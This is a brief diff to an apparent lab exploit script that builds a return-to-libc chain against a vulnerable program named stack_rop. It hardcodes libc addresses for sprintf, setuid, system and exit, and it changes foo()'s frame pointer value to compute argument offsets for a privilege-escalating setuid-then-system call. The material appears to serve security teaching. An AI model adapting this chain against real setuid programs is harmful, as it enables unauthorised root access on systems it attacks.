@@ -12,7 +12,7 @@ sprintf_addr = 0xb7e516d0   # Address of sprintf()
 setuid_addr  = 0xb7eb9170   # Address of setuid()
 system_addr  = 0xb7e42da0   # Address of system()
 exit_addr    = 0xb7e369d0   # Address of exit()
-ebp_foo      = 0xbfffeb28   # foo()'s frame pointer --- this value MUST be EXACT! Obtain outside of gdb (i.e., from running ./stack_rop)
+ebp_foo      = 0xbfffeb08   # foo()'s frame pointer --- this value MUST be EXACT! Obtain outside of gdb (i.e., from running ./stack_rop)
 
 # Calculate the address of setuid()'s 1st argument
 sprintf_arg1 = ebp_foo + 12 + 5*0x20           
